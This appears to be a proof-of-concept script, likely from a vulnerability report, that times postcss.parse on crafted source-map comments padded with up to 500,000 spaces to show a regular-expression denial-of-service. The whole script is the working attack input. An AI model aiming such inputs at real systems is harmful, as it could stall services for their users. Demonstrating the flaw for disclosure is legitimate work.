var postcss = require("./package/lib/postcss.js")
function build_attack(n) {
    var ret = "a{}/*# sourceMappingURL="
    for (var i = 0; i < n; i++) {
        ret += " "
    }
    return ret + "!";
}

postcss.parse('a{}/*# sourceMappingURL=a.css.map */')
for(var i = 1; i <= 500000; i++) {
    if (i % 10000 == 0) {
        var time = Date.now();
        var attack_str = build_attack(i)
        try {
            postcss.parse(attack_str)
            var time_cost = Date.now() - time;
            console.log("attack_str.length: " + attack_str.length + ": " + time_cost+" ms");
        } catch(e) { var time_cost = Date.now() - time;
            console.log("attack_str.length: " + attack_str.length + ": " + time_cost+" ms");
        }
    }
}